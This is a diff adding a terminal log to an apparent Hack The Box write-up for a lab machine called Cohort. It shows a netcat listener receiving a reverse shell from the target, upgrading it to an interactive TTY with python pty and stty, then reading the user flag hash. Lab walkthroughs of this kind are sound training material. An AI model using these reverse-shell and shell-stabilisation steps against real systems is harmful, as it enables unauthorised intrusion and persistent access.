@@ -2155,6 +2155,39 @@ marimo@cohort:~$
 
 **Next:**  
 Command execution is established but not interactive. Start a listener and use the exploit's reverse-shell mode to obtain a persistent interactive shell as `marimo`.
+
+```
+┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.77] from (UNKNOWN) [10.129.121.70] 37362
+marimo@cohort:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'              
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+marimo@cohort:~$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                                                                                                           
+┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 4444
+
+marimo@cohort:~$ export TERM=xterm
+marimo@cohort:~$ is
+Command 'is' not found, but can be installed with:
+apt install ironseed
+Please ask your administrator.
+marimo@cohort:~$ id
+uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
+marimo@cohort:~$ ls /home
+marimo
+marimo@cohort:~$ pwd
+/home/marimo
+marimo@cohort:~$ ls
+notebooks  user.txt
+marimo@cohort:~$ cat user.txt 
+52aa58a6a2556cc193fc04e0d1db8660
+marimo@cohort:~$ 
+
+```
 <div align="center">
 <br>
 <br>
